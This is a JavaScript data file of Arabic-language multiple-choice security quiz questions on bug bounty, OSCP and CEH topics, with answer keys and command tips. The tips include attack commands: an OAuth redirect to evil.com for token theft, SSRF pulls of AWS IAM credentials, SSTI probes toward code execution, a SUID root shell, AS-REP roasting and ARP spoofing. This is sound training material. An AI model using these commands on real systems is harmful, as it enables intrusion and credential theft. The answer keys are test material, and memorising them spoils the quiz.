const ALL_QUESTIONS = [
      { id: 1, cat: 'recon', diff: 'easy',
        question: 'لديك 800 Subdomains حية، ما أول 3 خطوات تقوم بها للفحص الفعال؟',
        options: [
          'تشغيل Nuclei على جميع المنافذ لتوفير الوقت.',
          'فرز النطاقات وتصنيفها (Categorize) ثم فحص CNAME للـ 404s ثم port scan للمنافذ الحساسة.',
          'تشغيل FFUF على كافة المسارات دفعة واحدة.',
          'تشغيل sqlmap على كل رابط متاح.'
        ],
        correct: 1,
        explanation: '<strong>المنهجية الصحيحة:</strong> دايماً تبدأ بالتصنيف — افرز الـ 800 subdomain بالـ tech stack، حدد الأولويات (scope جديد؟ admin panels؟)، افحص CNAME لاكتشاف Subdomain Takeover، ثم port scan للمنافذ الحساسة (8080, 8443, 9200, etc).',
        tip: 'httpx -l subs.txt -sc -td -cl -title | sort | uniq'
      },
      { id: 2, cat: 'exploit', diff: 'medium',
        question: 'اكتشفت Open Redirect على موقع يستخدم OAuth2. ما خطورة هذا الاكتشاف؟',
        options: [
          'لا خطورة، Open Redirect غير ضار وحده.',
          'خطر منخفض، يمكن تصنيفه P4 فقط.',
          'خطر عالي جداً — يمكن استخدامه لسرقة access_token عبر redirect_uri manipulation.',
          'خطر متوسط فقط إذا كان يمكن تغيير الـ domain.'
        ],
        correct: 2,
        explanation: '<strong>Open Redirect + OAuth = Critical!</strong> في OAuth2، الـ redirect_uri المفتوحة تسمح للمهاجم بتوجيه الـ access_token إلى موقع خارجي. هذه من أقوى Chain vulnerabilities في Bug Bounty وتُصنَّف P1 في معظم البرامج.',
        tip: '// Chain: /oauth/authorize?redirect_uri=https://evil.com → سرقة token'
      },
      { id: 3, cat: 'tools', diff: 'easy',
        question: 'ما الأمر الصحيح لاستخدام subfinder لاكتشاف النطاقات الفرعية بشكل شامل مع حفظ النتائج؟',
        options: [
          'subfinder -u target.com -save all.txt',
          'subfinder -d target.com -all -recursive -o subs.txt',
          'subfinder --domain target.com --output subs.txt',
          'subfinder -t target.com -r -out subs.txt'
        ],
        correct: 1,
        explanation: '<strong>subfinder -d -all -recursive</strong> هو الأمر الصحيح. الـ flag -all يُفعّل جميع مصادر البيانات، والـ -recursive يبحث في النطاقات الفرعية بشكل متكرر للحصول على أعمق نتائج.',
        tip: 'subfinder -d target.com -all -recursive -o subs.txt | wc -l'
      },
      { id: 4, cat: 'xss', diff: 'medium',
        question: 'في أي حالة يكون Stored XSS أخطر من Reflected XSS؟',
        options: [
          'في أي حالة، هما نفس الخطورة دائماً.',
          'عندما يراه مدير النظام أو موظفو الدعم الفني — يؤدي لـ Session Hijacking لحسابات ذات صلاحيات عالية.',
          'Reflected XSS دائماً أخطر لأنه يصعب اكتشافه.',
          'Stored XSS أخطر فقط إذا كان في نموذج تسجيل.'
        ],
        correct: 1,
        explanation: '<strong>Stored XSS في لوحة الإدارة = Critical!</strong> إذا كان الـ payload مخزن في مكان يراه الـ Admin (مثل تذاكر الدعم أو التعليقات)، فيمكن سرقة Session الأدمن وتنفيذ أوامر بصلاحياته الكاملة. هذه حالة Account Takeover كاملة.',
        tip: '// Target: Support Tickets, Admin Comments, User Profiles'
      },
      { id: 5, cat: 'logic', diff: 'hard',
        question: 'وجدت API endpoint يستقبل: {"user_id": 123, "role": "user"}. ما أول ما تحاول تعديله؟',
        options: [
          'تغيير user_id فقط لأرقام عشوائية.',
          'إضافة حقول غير معروفة مثل {"admin": true} مع تغيير role إلى "admin".',
          'إرسال request فارغ لاختبار الـ validation.',
          'تشفير الـ JSON وإرساله مرة أخرى.'
        ],
        correct: 1,
        explanation: '<strong>Mass Assignment Vulnerability!</strong> دائماً جرّب إضافة حقول غير معلنة مثل: "role":"admin", "is_admin":true, "verified":true, "account_type":"premium". كثير من الـ APIs تقبل هذه الحقول وتمرّرها مباشرة لقاعدة البيانات دون تصفية.',
        tip: '{"user_id": 123, "role": "admin", "is_admin": true, "verified": true}'
      },
      { id: 6, cat: 'recon', diff: 'medium',
        question: 'ما الفرق الأساسي بين Passive Recon و Active Recon في Bug Bounty؟',
        options: [
          'لا فرق، كلاهما يصل لنفس المعلومات.',
          'Passive = جمع معلومات دون الاتصال بالهدف (OSINT). Active = إرسال requests مباشرة للهدف.',
          'Passive أبطأ وActive أسرع فقط.',
          'Passive للـ subdomains فقط وActive للـ vulnerabilities فقط.'
        ],
        correct: 1,
        explanation: '<strong>Passive vs Active:</strong> في Passive تستخدم مصادر خارجية (Shodan, Censys, crt.sh, Archive.org) دون أي تواصل مع الهدف. في Active تُرسل requests فعلية. أهمية التمييز: بعض البرامج تحظر Active scanning خارج scope.',
        tip: 'passive: curl "https://crt.sh/?q=%.target.com&output=json" | jq .[].name_value'
      },
      { id: 7, cat: 'exploit', diff: 'hard',
        question: 'وجدت SSRF في endpoint يتصل بـ internal services. ما أول الـ targets الداخلية تحاول الوصول إليها؟',
        options: [
          '192.168.1.1 فقط — الـ router الداخلي.',
          'http://localhost:80 فقط.',
          'AWS Metadata (169.254.169.254)، internal services (localhost, 127.x.x.x)، وCloud metadata endpoints.',
          'قاعدة البيانات مباشرة على port 3306.'
        ],
        correct: 2,
        explanation: '<strong>SSRF Priority Order:</strong> 1) Cloud Metadata: http://169.254.169.254/latest/meta-data/ (AWS Keys!) 2) Internal services: http://localhost:8080, :9200 (Elasticsearch) 3) GCP: http://metadata.google.internal 4) Azure: http://169.254.169.254/metadata/instance',
        tip: 'curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/"'
      },
      { id: 8, cat: 'tools', diff: 'easy',
        question: 'ما الأداة الأمثل لاستخراج الـ Endpoints والـ Secrets من ملفات JavaScript؟',
        options: [
          'Burp Suite فقط — يكفي للـ JS analysis.',
          'LinkFinder + JSluice + Secret Finder معاً — لأن كل أداة لها نقاط قوة مختلفة.',
          'grep فقط مع keywords يدوياً.',
          'Nuclei فقط مع template js-exposures.'
        ],
        correct: 1,
        explanation: '<strong>JS Analysis Arsenal:</strong> LinkFinder يستخرج URLs والـ endpoints. JSluice يُنشئ structural map للكود. SecretFinder يبحث عن API keys وTokens. الجمع بينهم = تغطية كاملة.',
        tip: 'python3 linkfinder.py -i https://target.com/app.js -o cli'
      },
      { id: 9, cat: 'logic', diff: 'medium',
        question: 'ما هو IDOR وكيف تميّز بين IDOR حقيقي وـ False Positive؟',
        options: [
          'IDOR = Injection Danger in Open Request. False Positive = حين يعطي نفس البيانات.',
          'IDOR = Insecure Direct Object Reference. هو حقيقي فقط إذا وصلت لبيانات user آخر دون صلاحية مباشرة.',
          'IDOR حقيقي دائماً إذا تغيّر الـ ID في URL.',
          'IDOR وFalse Positive لا فرق بينهما عملياً.'
        ],
        correct: 1,
        explanation: '<strong>IDOR الحقيقي:</strong> يجب إثبات وصولك لبيانات/إجراءات خاصة بحساب آخر. الـ False Positive: تغيير ID يعطي 403 أو نفس بيانات حسابك. للإثبات: أنشئ حسابين وجرّب الوصول لبيانات الحساب الثاني من الأول.',
        tip: '// Test: Account A reads Account B private data → Valid IDOR!'
      },
      { id: 10, cat: 'xss', diff: 'hard',
        question: 'ما الفرق بين XSS وCSRF وكيف تُميّز أيهما تستغل؟',
        options: [
          'هما نفس الثغرة بأسماء مختلفة.',
          'XSS = تنفيذ JS في متصفح الضحية لسرقة Session. CSRF = تنفيذ actions باسم الضحية دون علمه. استخدم XSS حين لا يوجد CSRF Token وCSRF حين يمكن تزوير الطلبات.',
          'CSRF أقوى دائماً من XSS.',
          'XSS للـ frontend فقط وCSRF للـ backend فقط.'
        ],
        correct: 1,
        explanation: '<strong>XSS vs CSRF:</strong> XSS: تحكم كامل في متصفح الضحية — تقرأ cookies، ترسل requests بـ credentials. CSRF: تجبر الضحية على إجراء action محدد. إذا وجدت XSS Stored في تطبيق بـ CSRF protection ← استخدم XSS لتجاوز الحماية!',
        tip: '// XSS Chain: steal CSRF token → perform privileged action'
      },
      { id: 11, cat: 'recon', diff: 'easy',
        question: 'ما هو الـ HTTP Status Code الذي يشير إلى احتمال Subdomain Takeover؟',
        options: [
          '200 OK — الصفحة تعمل بشكل طبيعي.',
          '403 Forbidden — الصفحة محمية.',
          '404 Not Found على subdomain مع CNAME يشير لخدمة خارجية (GitHub Pages, S3, Heroku).',
          '500 Internal Server Error.'
        ],
        correct: 2,
        explanation: '<strong>Subdomain Takeover Signs:</strong> CNAME يشير لـ GitHub Pages/S3/Heroku + 404 = خدمة غير مُعيَّنة يمكن أخذها! تحقق بـ can-i-take-over-xyz list وسجّل على الخدمة المستهدفة.',
        tip: 'for sub in $(cat subs.txt); do dig CNAME $sub; done | grep -i "github\\|heroku\\|s3"'
      },
      { id: 12, cat: 'exploit', diff: 'medium',
        question: 'وجدت SQL Injection، ما ترتيب خطوات الاستغلال الصحيح؟',
        options: [
          'تشغيل sqlmap مباشرة بكل flags للسرعة.',
          'أولاً التحقق اليدوي (single quote)، ثم تحديد نوع الـ injection، ثم استخراج database schema، ثم sqlmap بالـ config الصحيح.',
          'محاولة استخراج /etc/passwd مباشرة.',
          'Report الثغرة مباشرة دون استغلال.'
        ],
        correct: 1,
        explanation: '<strong>SQLi Methodology:</strong> 1) اختبار يدوي: `\' OR 1=1--` 2) تحديد النوع (Error/Union/Blind/Time-based) 3) استخراج DB schema: information_schema.tables 4) sqlmap مع الـ parameters الصحيحة.',
        tip: 'sqlmap -u "https://target.com/page?id=1" --dbs --batch --level=3'
      },
      { id: 13, cat: 'tools', diff: 'medium',
        question: 'ما الفرق الرئيسي بين httpx وcurl في Bug Bounty Recon؟',
        options: [
          'لا فرق، كلاهما يفعل نفس الشيء.',
          'httpx مُصمَّم للـ bulk scanning لآلاف المنافذ مع tech detection. curl لاختبار فردي يدوي.',
          'curl أسرع دائماً.',
          'httpx يستخدم فقط مع Nuclei.'
        ],
        correct: 1,
        explanation: '<strong>httpx vs curl:</strong> httpx يمكنه فحص آلاف URLs معاً بـ concurrency عالية، يكشف التقنيات، status codes، titles، ويدعم تصفية النتائج. curl للاختبار الدقيق المفرد والـ debugging.',
        tip: 'cat subs.txt | httpx -sc -td -cl -title -mc 200,301,302 -o live_hosts.txt'
      },
      { id: 14, cat: 'logic', diff: 'hard',
        question: 'ما هو Race Condition Bug وما أفضل طريقة لاستغلاله؟',
        options: [
          'هو خطأ في سرعة الاستجابة فقط.',
          'استغلال فترة زمنية بين التحقق والتنفيذ (TOCTOU). يُستغل بإرسال requests متزامنة متعددة في نفس اللحظة.',
          'يحدث فقط في الـ APIs.',
          'هو نفس Buffer Overflow.'
        ],
        correct: 1,
        explanation: '<strong>Race Condition (TOCTOU):</strong> Time-of-Check vs Time-of-Use. مثال كلاسيكي: استخدام كود خصم مرتين بإرسال requestين في نفس الـ millisecond قبل أن يُسجَّل الأول. الاستغلال: Burp Suite Turbo Intruder أو HTTP/2 Single Packet Attack.',
        tip: '// Burp: Send to Turbo Intruder → use race_single_packet_attack.py'
      },
      { id: 15, cat: 'xss', diff: 'medium',
        question: 'كيف تتجاوز CSP (Content Security Policy) إذا كانت تسمح بـ \'unsafe-inline\'؟',
        options: [
          'لا يمكن تجاوز CSP نهائياً.',
          '\'unsafe-inline\' يعني XSS الكلاسيكي يعمل مباشرة! CSP بـ unsafe-inline تساوي لا CSP.',
          'يجب استخدام eval() فقط.',
          '\'unsafe-inline\' تحمي من XSS وتسمح بـ CSS فقط.'
        ],
        correct: 1,
        explanation: '<strong>CSP Bypass:</strong> \'unsafe-inline\' يُبطل حماية CSP ضد XSS الكلاسيكي. حتى مع CSP صارمة، يمكن البحث عن script-src يسمح بـ JSONP endpoints أو CDNs ذات payloads مخزنة.',
        tip: '// Check: curl -I https://target.com | grep -i content-security-policy'
      },
      { id: 16, cat: 'recon', diff: 'hard',
        question: 'كيف تكتشف الـ Origin IP لموقع خلف Cloudflare؟',
        options: [
          'لا يمكن اكتشافه أبداً خلف Cloudflare.',
          'ping فقط.',
          'البحث في DNS History (SecurityTrails)، Shodan، Certificate Transparency، وSubdomain Enumeration لإيجاد subdomains قديمة بدون CDN.',
          'استخدام traceroute فقط.'
        ],
        correct: 2,
        explanation: '<strong>Cloudflare Bypass Techniques:</strong> 1) SecurityTrails/ViewDNS لـ historical DNS 2) crt.sh للبحث في SSL certificates القديمة 3) Shodan: ssl.cert.subject.cn:target.com 4) Subdomains قديمة (mail., staging., dev.) قد تكشف الـ real IP',
        tip: 'shodan search "ssl.cert.subject.cn:target.com" | grep IP'
      },
      { id: 17, cat: 'exploit', diff: 'easy',
        question: 'ما هو الـ Payload الأبسط لاختبار Server-Side Template Injection (SSTI)؟',
        options: [
          "'1 OR 1=1--",
          "<script>alert(1)<\/script>",
          "\\x7B\\x7B7*7}} أو ${7*7} — إذا أعطى 49 فالـ SSTI موجود!",
          "; ls -la"
        ],
        correct: 2,
        explanation: '<strong>SSTI Detection:</strong> الـ payload الرياضي هو أسرع طريقة للكشف. \\x7B\\x7B7*7}} يعمل مع Jinja2/Twig. ${7*7} مع Thymeleaf. إذا ظهر 49 في الـ response = RCE محتمل! ثم جرب: \\x7B\\x7Bconfig}}, \\x7B\\x7Bself.__class__.__mro__}}',
        tip: '\\x7B\\x7B7*7}} → \\x7B\\x7B7*\'7\'}} → \\x7B\\x7Bconfig.items()}} → RCE!'
      },
      { id: 18, cat: 'tools', diff: 'hard',
        question: 'ما هو الاستخدام الصحيح لـ Nuclei لتجنب الـ False Positives وتوفير الوقت؟',
        options: [
          'تشغيل nuclei -l targets.txt فقط بدون أي options.',
          'تشغيله على كل الـ templates دفعة واحدة على جميع الأهداف.',
          'تحديد templates محددة (cves, exposed-panels, vulnerabilities) مع -severity critical,high وتجنب templates الـ information.',
          'استخدامه فقط مع port scanning.'
        ],
        correct: 2,
        explanation: '<strong>Nuclei Best Practices:</strong> استخدم: -t cves/,exposed-panels/,vulnerabilities/ -severity critical,high -rate-limit 50. تجنب -t all لأنه يُنتج آلاف الـ FPs. أضف -stats لمتابعة التقدم.',
        tip: 'nuclei -l live.txt -t cves/ -t exposed-panels/ -severity critical,high -rl 50 -o results.txt'
      },
      { id: 19, cat: 'logic', diff: 'medium',
        question: 'ما هي أخطر ثغرة في JWT يجب البحث عنها أولاً؟',
        options: [
          'استخدام HS256 بدلاً من RS256.',
          'Algorithm Confusion (alg:none) وRSA to HMAC Confusion — تسمح بتزوير أي token.',
          'انتهاء صلاحية التوقيع.',
          'طول الـ secret key القصير فقط.'
        ],
        correct: 1,
        explanation: '<strong>JWT Vulnerabilities Priority:</strong> 1) alg:none - قبول token بدون توقيع 2) HMAC/RSA Confusion - استخدام المفتاح العام للتوقيع 3) Weak secret (brute force) 4) Missing expiry. استخدم jwt_tool لاختبار كل هذه الحالات تلقائياً.',
        tip: 'python3 jwt_tool.py <token> -X a -X s -X n'
      },
      { id: 20, cat: 'recon', diff: 'medium',
        question: 'ما الفائدة من Google Dorks في Bug Bounty؟',
        options: [
          'لا فائدة منها، البرامج تمنعها.',
          'اكتشاف ملفات حساسة مكشوفة (config, backup, git)، login panels، وأخطاء مكشوفة دون الاتصال بالهدف مباشرة.',
          'لإيجاد SQL Injection فقط.',
          'تستخدم فقط لمعرفة IP الهدف.'
        ],
        correct: 1,
        explanation: '<strong>Google Dorks Power:</strong> site:target.com ext:sql OR ext:env OR ext:bak → ملفات حساسة. site:target.com inurl:admin → لوحات إدارة. site:target.com "Index of /" → Directory listing. intext:"SQL syntax" site:target.com → SQL Errors',
        tip: 'site:target.com ext:env OR ext:git OR ext:bak OR ext:sql'
      },
{
    "id": 101,
    "cat": "oscp",
    "diff": "medium",
    "question": "أثناء فحص شبكة داخلية (OSCP Lab)، وجدت المنفذ 445 مفتوحاً ولكن بدون Null Session. كيف تستخرج قائمة الـ Users باستخدام حساب صالح (Valid Credentials)؟",
    "options": [
      "nmap -p 445 --script smb-vuln*",
      "crackmapexec smb <IP> -u 'user' -p 'pass' --users",
      "smbclient -L //IP/ -N",
      "enum4linux -a <IP>"
    ],
    "correct": 1,
    "explanation": "<strong>SMB Enumeration:</strong> لاستخراج الـ Users عندما تملك Credentials صالحة، أداة `crackmapexec` أو `netexec` هي الأفضل والأسرع، `enum4linux` يعمل أيضاً ولكن CME أكثر كفاءة.",
    "tip": "crackmapexec smb 10.10.10.10 -u 'john' -p 'password123' --users"
  },
  {
    "id": 102,
    "cat": "oscp",
    "diff": "hard",
    "question": "اخترقت سيرفر Linux بصلاحيات مستخدم عادي (www-data). وجدت ملف SUID اسمه 'find' (/usr/bin/find). كيف تستخدمه للوصول إلى Root؟",
    "options": [
      "find . -exec /bin/sh \\; -quit",
      "find / -name root.txt",
      "sudo find / -exec sh \\;",
      "chmod +s /bin/bash"
    ],
    "correct": 0,
    "explanation": "<strong>SUID Privilege Escalation:</strong> الأمر `find` إذا كان يحتوي على SUID bit، يمكنه تنفيذ أوامر بصلاحية مالك الملف (غالباً Root) باستخدام الـ flag `-exec`. هذا أمر أساسي في منهجية OSCP.",
    "tip": "find . -exec /bin/sh -p \\; -quit"
  },
  {
    "id": 103,
    "cat": "oscp",
    "diff": "medium",
    "question": "في بيئة Active Directory، ما هو هجوم AS-REP Roasting؟",
    "options": [
      "استخراج TGS للخدمات التي تعمل بحسابات مستخدمين وتخمين الـ Hash.",
      "استخراج الـ Hash الخاص بالمستخدمين الذين لديهم خاصية 'Do not require Kerberos preauthentication' مفعلة.",
      "سرقة الـ NTLM Hash من الذاكرة باستخدام Mimikatz.",
      "إرسال طلب مزيف للـ Domain Controller لتغيير كلمة مرور الـ Admin."
    ],
    "correct": 1,
    "explanation": "<strong>AS-REP Roasting:</strong> هجوم يستهدف المستخدمين الذين ليس لديهم Pre-Auth مفعل، مما يسمح للمهاجم بطلب تذكرة AS-REP من الـ KDC واستخراج الـ Hash لتخمينه Offline.",
    "tip": "GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.10"
  },
  {
    "id": 104,
    "cat": "oscp",
    "diff": "hard",
    "question": "في بيئة Windows Privilege Escalation، ما هو استغلال SeImpersonatePrivilege؟",
    "options": [
      "استغلال ثغرة في Kernel للحصول على SYSTEM.",
      "استخدام أدوات مثل PrintSpoofer أو JuicyPotato لإجبار خدمة تعمل بصلاحية SYSTEM على المصادقة معك، ومن ثم انتحال الـ Token الخاص بها.",
      "تغيير مسار خدمة (Unquoted Service Path).",
      "قراءة الـ SAM Database."
    ],
    "correct": 1,
    "explanation": "<strong>Token Impersonation:</strong> صلاحية SeImpersonate (غالباً موجودة لدى IIS و SQL Server) تسمح لك بانتحال Tokens. باستخدام PrintSpoofer (لـ Windows 10/Server 2016+) يمكنك الحصول على SYSTEM.",
    "tip": "PrintSpoofer.exe -i -c cmd"
  },
  {
    "id": 105,
    "cat": "oscp",
    "diff": "medium",
    "question": "في Buffer Overflow (منهجية OSCP القديمة/الأساسية)، ما هي فائدة JMP ESP؟",
    "options": [
      "إيقاف تشغيل الحماية DEP.",
      "القفز إلى عنوان عشوائي في الذاكرة.",
      "الكتابة فوق EIP لجعله يقفز إلى عنوان يحتوي على تعليمة JMP ESP، والتي بدورها تنقل التنفيذ إلى الـ Stack (حيث يوجد الـ Shellcode الخاص بك).",
      "زيادة حجم الـ Buffer لتجنب الانهيار."
    ],
    "correct": 2,
    "explanation": "<strong>Buffer Overflow Basics:</strong> تعليمة JMP ESP ضرورية لتوجيه مسار التنفيذ إلى أعلى الـ Stack (المؤشر ESP)، حيث تقوم بوضع الـ Shellcode الخبيث.",
    "tip": "!mona jmp -r esp -cpb \"\\x00\\x0a\\x0d\""
  },
  {
    "id": 201,
    "cat": "ceh",
    "diff": "easy",
    "question": "حسب منهجية CEH، ما هي الخطوة الأولى في الـ Ethical Hacking؟",
    "options": [
      "Scanning",
      "Gaining Access",
      "Reconnaissance / Footprinting",
      "Maintaining Access"
    ],
    "correct": 2,
    "explanation": "<strong>Hacking Phases:</strong> المنهجية الرسمية (EC-Council) تبدأ دائماً بـ Reconnaissance (جمع المعلومات)، تليها Scanning، ثم Gaining Access، ثم Maintaining Access، وأخيراً Clearing Tracks.",
    "tip": "Recon is 80% of the work."
  },
  {
    "id": 202,
    "cat": "ceh",
    "diff": "medium",
    "question": "أداة Nmap: ما هو الـ flag المستخدم لإجراء XMAS Scan؟",
    "options": [
      "-sS",
      "-sX",
      "-sU",
      "-sA"
    ],
    "correct": 1,
    "explanation": "<strong>XMAS Scan (-sX):</strong> يقوم بإرسال حزمة TCP مفعل فيها (FIN, PSH, URG). يستخدم لتجاوز بعض أنواع الـ Firewalls التي تراقب الـ SYN packets فقط.",
    "tip": "nmap -sX -p 1-1024 10.10.10.10"
  },
  {
    "id": 203,
    "cat": "ceh",
    "diff": "easy",
    "question": "ما هو الهجوم الذي يعتمد على تزييف الـ MAC Address لربط الـ IP الخاص بالـ Gateway بجهاز المهاجم؟",
    "options": [
      "DNS Spoofing",
      "DHCP Starvation",
      "ARP Spoofing",
      "MAC Flooding"
    ],
    "correct": 2,
    "explanation": "<strong>ARP Spoofing:</strong> يقوم المهاجم بتسميم الـ ARP Cache الخاص بالضحية ليظن أن المهاجم هو الـ Router (الـ Gateway)، مما يتيح له تنفيذ Man-In-The-Middle (MITM).",
    "tip": "arpspoof -i eth0 -t <Target_IP> <Gateway_IP>"
  },
  {
    "id": 204,
    "cat": "ceh",
    "diff": "medium",
    "question": "ما هي أفضل طريقة للحماية من هجمات الـ SQL Injection حسب توصيات الأمان؟",
    "options": [
      "استخدام Firewalls على الشبكة.",
      "تشفير قاعدة البيانات بـ AES-256.",
      "استخدام Prepared Statements (Parameterized Queries).",
      "تشفير كلمة مرور الـ Admin بـ MD5."
    ],
    "correct": 2,
    "explanation": "<strong>SQLi Prevention:</strong> الـ Prepared Statements تفصل الكود البرمجي (الاستعلام) عن البيانات المدخلة، مما يجعل من المستحيل على المدخلات أن تغير مسار الاستعلام.",
    "tip": "Always use PDO/Parameterized Queries in your code."
  },
  {
    "id": 301,
    "cat": "bugbounty",
    "diff": "hard",
    "question": "وجدت تطبيق يسمح لك برفع صورة (Avatar). قمت برفع ملف PHP، ولكن السيرفر يعيد تسمية الملف إلى .png ويمسح أي كود PHP. كيف تتجاوز هذه الحماية إذا كان السيرفر يستخدم ImageMagick قديم؟",
    "options": [
      "الاستسلام، السيرفر آمن تماماً.",
      "تغيير Content-Type في Burp إلى text/php.",
      "استخدام ثغرة ImageTragick عن طريق وضع payload داخل ملف .mvg مدمج في الصورة.",
      "رفع ملف .htaccess."
    ],
    "correct": 2,
    "explanation": "<strong>ImageTragick (CVE-2016-3714):</strong> إذا كان التطبيق يستخدم ImageMagick قديم لمعالجة الصور، يمكن كتابة كود مخصص (MVG) يؤدي إلى RCE أثناء معالجة الصورة، بغض النظر عن الامتداد.",
    "tip": "Search for ImageTragick MVG payload."
  },
  {
    "id": 302,
    "cat": "bugbounty",
    "diff": "medium",
    "question": "ما هي ثغرة BOLA (Broken Object Level Authorization) في الـ APIs؟",
    "options": [
      "تخطي المصادقة (Authentication) كلياً بدون توكن.",
      "القدرة على تغيير الـ ID في الـ API Endpoint للوصول إلى بيانات مستخدم آخر (تعرف أيضاً بـ IDOR).",
      "حقن أوامر SQL داخل الـ JSON.",
      "إرسال طلبات كثيرة جداً لإسقاط السيرفر (Rate Limit)."
    ],
    "correct": 1,
    "explanation": "<strong>BOLA / IDOR:</strong> تعتبر رقم 1 في قائمة OWASP API Security. تحدث عندما لا يتحقق الـ API مما إذا كان المستخدم الحالي لديه صلاحية للوصول إلى الـ Object ID المطلوب.",
    "tip": "Always test endpoints like /api/users/123 by changing it to 124."
  },
  {
    "id": 303,
    "cat": "bugbounty",
    "diff": "hard",
    "question": "اكتشفت ثغرة SSRF ولكن الـ Target يعمل ببيئة AWS. ما هو الـ Endpoint الذي ستحاول الوصول إليه لاستخراج الـ IAM Credentials؟",
    "options": [
      "http://127.0.0.1/admin",
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://metadata.google.internal/",
      "http://aws.amazon.com/credentials"
    ],
    "correct": 1,
    "explanation": "<strong>AWS Metadata SSRF:</strong> الـ IP السحري في Cloud Environments هو 169.254.169.254. في بيئة AWS، المسار المذكور يحتوي على الـ Temporary Credentials الخاصة بالدور (Role) المربوط بـ EC2.",
    "tip": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  },
  {
    "id": 304,
    "cat": "bugbounty",
    "diff": "medium",
    "question": "في الـ Bug Bounty، ماذا يقصد بـ 'Second-Order SQL Injection'؟",
    "options": [
      "استخدام أداتين SQLmap في نفس الوقت.",
      "إدخال Payload في نموذج، ويتم تخزينه في الـ Database بأمان، ثم يتم تنفيذه لاحقاً عند استدعائه في استعلام آخر.",
      "إدخال Payload يتم تنفيذه مباشرة في الـ Response.",
      "استغلال الـ SQL Injection عبر الـ Headers فقط."
    ],
    "correct": 1,
    "explanation": "<strong>Second-Order SQLi:</strong> الخطورة تكمن في أن المطور قد يقوم بفلترة البيانات عند الإدخال (الخطوة 1)، لكنه يثق بالبيانات الخارجة من الـ Database ويضعها في استعلام آخر بدون فلترة (الخطوة 2).",
    "tip": "Think about User Profile update -> Display Profile features."
  },
  {
    "id": 401,
    "cat": "general",
    "diff": "easy",
    "question": "ما هو الـ Zero-Day Exploit؟",
    "options": [
      "ثغرة تم اكتشافها وإصدار ترقيع (Patch) لها اليوم.",
      "فيروس يصيب الجهاز ويمسح البيانات في صفر يوم.",
      "ثغرة في نظام ما، غير معروفة للشركة المصنعة ولا يوجد لها ترقيع (Patch) حتى الآن.",
      "هجوم DDOS يستمر لأقل من يوم."
    ],
    "correct": 2,
    "explanation": "<strong>Zero-Day:</strong> تعني أن المطور لديه 'صفر أيام' لحل المشكلة لأنها مستغلة فعلياً ولم تكن معروفة لديه من قبل.",
    "tip": "Zero-days are the most expensive bugs in the market."
  },
  {
    "id": 402,
    "cat": "general",
    "diff": "easy",
    "question": "أي من بروتوكولات التشفير التالية يعتبر الأحدث والأكثر أماناً لشبكات الـ Wi-Fi؟",
    "options": [
      "WEP",
      "WPA2",
      "WPA3",
      "WPS"
    ],
    "correct": 2,
    "explanation": "<strong>WPA3:</strong> تم إطلاقه كتحسين لـ WPA2 ليحمي من هجمات التخمين (Dictionary Attacks) بفضل تقنية SAE (Simultaneous Authentication of Equals).",
    "tip": "Always disable WEP and WPS!"
  },
  {
    "id": 403,
    "cat": "general",
    "diff": "medium",
    "question": "ما هي تقنية الـ Sandbox في أمن المعلومات؟",
    "options": [
      "لعبة إلكترونية للهاكرز.",
      "بيئة معزولة وآمنة لتشغيل البرامج أو تحليل البرمجيات الخبيثة دون التأثير على النظام الأساسي.",
      "أداة لتسريع اتصال الإنترنت.",
      "نوع من أنواع الـ Firewalls."
    ],
    "correct": 1,
    "explanation": "<strong>Sandboxing:</strong> يستخدم بكثرة في تحليل الـ Malware (مثل Cuckoo Sandbox) لتشغيل الفيروس في بيئة افتراضية ومراقبة سلوكه بأمان.",
    "tip": "Use Windows Sandbox for quick safe execution."
  }
];
